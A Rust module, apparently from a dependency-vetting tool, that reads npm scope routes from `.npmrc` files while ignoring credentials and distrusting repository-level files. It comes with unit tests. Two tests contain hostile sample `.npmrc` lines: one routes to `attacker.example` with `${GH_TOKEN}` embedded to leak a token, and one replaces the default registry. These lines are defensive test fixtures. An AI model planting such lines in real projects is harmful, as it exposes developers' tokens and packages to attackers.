//! `.npmrc` discovery: the registry a scope already resolves to.
//!
//! Scope routes are read as a convenience, after explicit configuration.
//! Credentials are deliberately not read at all: a token in a repository file
//! would break the trust boundary, and a token in `~/.npmrc` belongs in
//! `~/.config/dep-vet/registries.toml` where `auth = "env:VAR"` already works.

use std::path::{Path, PathBuf};

use crate::model::Ecosystem;
use crate::registries::RegistryEntry;

#[derive(Debug, Default, PartialEq, Eq)]
pub struct NpmrcRoutes {
    /// The default registry, when `registry=` names a non-npmjs host. It
    /// replaces the public default the way it replaces it for `npm install`.
    pub default_registry: Option<String>,
    /// `@scope` to registry, in first-seen order.
    pub scopes: Vec<(String, String)>,
}

/// Parses one file. `${VAR}` is expanded from the environment; an unset
/// variable drops the entry rather than routing to a literal `${VAR}`.
pub fn parse(body: &str, env: impl Fn(&str) -> Option<String>) -> NpmrcRoutes {
    let mut routes = NpmrcRoutes::default();
    for raw in body.lines() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim();
        let value = value.trim();
        let Some(value) = expand(value, &env) else {
            continue;
        };
        if key == "registry" {
            if !is_public_npm(&value) {
                routes.default_registry = Some(value);
            }
            continue;
        }
        if let Some(scope) = key.strip_suffix(":registry")
            && scope.starts_with('@')
            && !scope.contains(' ')
        {
            routes.scopes.retain(|(existing, _)| existing != scope);
            routes.scopes.push((scope.to_string(), value));
        }
    }
    routes
}

/// User routes and project routes, kept apart so the caller can treat them
/// with different trust. A project file may not expand the environment: a
/// hostile repository could otherwise put `${GH_TOKEN}` in a URL and have the
/// token sent to its own host.
pub fn discover_split(
    home: Option<&Path>,
    project: Option<&Path>,
    env: impl Fn(&str) -> Option<String>,
) -> (NpmrcRoutes, NpmrcRoutes) {
    let user = read_file(home.map(|home| home.join(".npmrc")), &env);
    let mut project_routes =
        read_file(project.map(|project| project.join(".npmrc")), &|_: &str| {
            None
        });
    // A repository's `registry=` must not replace the public default for every
    // name; only scope routes survive discovery there.
    project_routes.default_registry = None;
    (user, project_routes)
}

fn read_file(path: Option<PathBuf>, env: &impl Fn(&str) -> Option<String>) -> NpmrcRoutes {
    path.and_then(|path| std::fs::read_to_string(path).ok())
        .map(|body| parse(&body, env))
        .unwrap_or_default()
}

/// Combined view for tests: the project overrides the user per scope, and the
/// caller supplies whatever environment expansion is appropriate.
pub fn discover(
    home: Option<&Path>,
    project: Option<&Path>,
    env: impl Fn(&str) -> Option<String> + Copy,
) -> NpmrcRoutes {
    let (user, project) = discover_split(home, project, env);
    let mut merged = user;
    for (scope, url) in project.scopes {
        merged.scopes.retain(|(existing, _)| *existing != scope);
        merged.scopes.push((scope, url));
    }
    merged
}

/// Scope routes as registry entries. They are inserted after explicit
/// configuration, so a `.depvet.toml` or per-user entry always wins.
pub fn as_entries(routes: &NpmrcRoutes) -> Result<Vec<RegistryEntry>, String> {
    let entries: Vec<RegistryEntry> = routes
        .scopes
        .iter()
        .map(|(scope, url)| RegistryEntry {
            ecosystem: Ecosystem::Npm,
            r#match: scope.clone(),
            url: url.clone(),
            auth: None,
            probe_public: true,
        })
        .collect();
    let allow_insecure =
        std::env::var("DEPVET_ALLOW_INSECURE_BASES").is_ok_and(|value| value == "1");
    // A discovered route is still a route: refuse the same things an explicit
    // entry may not do, instead of silently falling back to the public
    // registry for a scope the user believes is private.
    crate::registries::validate(&entries, allow_insecure, true).map_err(|error| {
        format!("npmrc: {error} (set DEPVET_NO_NPMRC=1 to ignore npmrc discovery)")
    })?;
    Ok(entries)
}

/// Discovery can be turned off with `DEPVET_NO_NPMRC=1`; tests set it so a
/// developer's own `~/.npmrc` cannot change a run.
pub fn enabled() -> bool {
    !std::env::var("DEPVET_NO_NPMRC").is_ok_and(|value| value == "1")
}

fn is_public_npm(url: &str) -> bool {
    let lowered = url.to_ascii_lowercase();
    lowered.starts_with("https://registry.npmjs.org")
        || lowered.starts_with("https://registry.yarnpkg.com")
}

fn expand(value: &str, env: &impl Fn(&str) -> Option<String>) -> Option<String> {
    let mut out = String::with_capacity(value.len());
    let mut rest = value;
    while let Some(start) = rest.find("${") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let end = after.find('}')?;
        let name = &after[..end];
        out.push_str(&env(name)?);
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn none(_: &str) -> Option<String> {
        None
    }

    #[test]
    fn scope_routes_are_parsed_and_comments_ignored() {
        let body = "\
# a comment
; another
@acme:registry=https://npm.acme.internal/
registry=https://registry.npmjs.org/
//npm.acme.internal/:_authToken=secret
";
        let routes = parse(body, none);
        assert_eq!(
            routes.scopes,
            vec![(
                "@acme".to_string(),
                "https://npm.acme.internal/".to_string()
            )]
        );
        assert_eq!(
            routes.default_registry, None,
            "the public default is not a route"
        );
    }

    #[test]
    fn a_private_default_registry_is_kept() {
        let routes = parse("registry=https://npm.corp.example/\n", none);
        assert_eq!(
            routes.default_registry.as_deref(),
            Some("https://npm.corp.example/")
        );
    }

    #[test]
    fn a_later_scope_wins() {
        let routes = parse(
            "@acme:registry=https://one/\n@acme:registry=https://two/\n",
            none,
        );
        assert_eq!(
            routes.scopes,
            vec![("@acme".to_string(), "https://two/".to_string())]
        );
    }

    #[test]
    fn variables_expand_and_an_unset_one_drops_the_entry() {
        let env = |key: &str| match key {
            "HOST" => Some("npm.acme.internal".to_string()),
            _ => None,
        };
        let routes = parse(
            "@acme:registry=https://${HOST}/\n@other:registry=https://${MISSING}/\n",
            env,
        );
        assert_eq!(
            routes.scopes,
            vec![(
                "@acme".to_string(),
                "https://npm.acme.internal/".to_string()
            )]
        );
    }

    #[test]
    fn tokens_are_never_read() {
        let routes = parse(
            "//npm.acme.internal/:_authToken=secret\n//npm.acme.internal/:username=me\n",
            none,
        );
        assert_eq!(routes, NpmrcRoutes::default());
    }

    #[test]
    fn project_entries_override_user_entries() {
        let home = tempfile::tempdir().unwrap();
        let project = tempfile::tempdir().unwrap();
        std::fs::write(
            home.path().join(".npmrc"),
            "@acme:registry=https://user/\nregistry=https://user-default/\n",
        )
        .unwrap();
        std::fs::write(
            project.path().join(".npmrc"),
            "@acme:registry=https://project/\n",
        )
        .unwrap();
        let routes = discover(Some(home.path()), Some(project.path()), none);
        assert_eq!(
            routes.scopes,
            vec![("@acme".to_string(), "https://project/".to_string())]
        );
        assert_eq!(
            routes.default_registry.as_deref(),
            Some("https://user-default/")
        );
    }

    #[test]
    fn a_project_file_may_not_expand_the_environment() {
        let home = tempfile::tempdir().unwrap();
        let project = tempfile::tempdir().unwrap();
        std::fs::write(
            project.path().join(".npmrc"),
            "@acme:registry=https://attacker.example/${GH_TOKEN}
",
        )
        .unwrap();
        let env = |key: &str| (key == "GH_TOKEN").then(|| "secret".to_string());
        let (_, project_routes) = discover_split(Some(home.path()), Some(project.path()), env);
        assert!(
            project_routes.scopes.is_empty(),
            "a repository file expanded an environment variable: {project_routes:?}"
        );
    }

    #[test]
    fn a_project_default_registry_is_ignored() {
        let home = tempfile::tempdir().unwrap();
        let project = tempfile::tempdir().unwrap();
        std::fs::write(
            project.path().join(".npmrc"),
            "registry=https://attacker.example/
",
        )
        .unwrap();
        let (_, project_routes) = discover_split(Some(home.path()), Some(project.path()), none);
        assert_eq!(project_routes.default_registry, None);
    }

    #[test]
    fn entries_are_npm_routes_without_credentials() {
        let routes = NpmrcRoutes {
            default_registry: None,
            scopes: vec![(
                "@acme".to_string(),
                "https://npm.acme.internal/".to_string(),
            )],
        };
        let entries = as_entries(&routes).unwrap();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].ecosystem, Ecosystem::Npm);
        assert_eq!(entries[0].r#match, "@acme");
        assert!(entries[0].auth.is_none());
    }
}
